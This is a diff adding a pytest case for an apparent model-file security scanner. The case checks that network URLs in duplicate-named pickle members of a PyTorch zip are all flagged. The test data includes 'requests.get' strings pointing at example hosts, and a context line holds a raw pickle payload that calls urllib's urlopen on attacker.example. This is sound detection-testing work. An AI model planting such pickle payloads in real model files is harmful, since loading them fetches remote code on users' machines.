@@ -11987,6 +11987,27 @@ def test_pytorch_zip_preserves_same_offset_network_findings_per_member(tmp_path:
     }
 
 
+def test_pytorch_zip_preserves_distinct_urls_from_duplicate_member_names(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "duplicate-member-network.pt", with_pickle=False, prefix="archive")
+    first_url = "https://one.example/payload"
+    second_url = "https://two.example/payload"
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", pickle.dumps({"loader": f"requests.get('{first_url}')"}, protocol=0))
+        with pytest.warns(UserWarning, match="Duplicate name"):
+            zipf.writestr("archive/data.pkl", pickle.dumps({"loader": f"requests.get('{second_url}')"}, protocol=0))
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    matched_urls = {
+        issue.details.get("matched_text")
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+    }
+    assert {first_url, second_url} <= matched_urls
+
+
 def test_pytorch_zip_keeps_network_url_reducer_actionable(tmp_path: Path) -> None:
     model_path = create_mock_pytorch_zip(tmp_path / "network-reducer.pt", with_pickle=False, prefix="archive")
     payload = b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR."
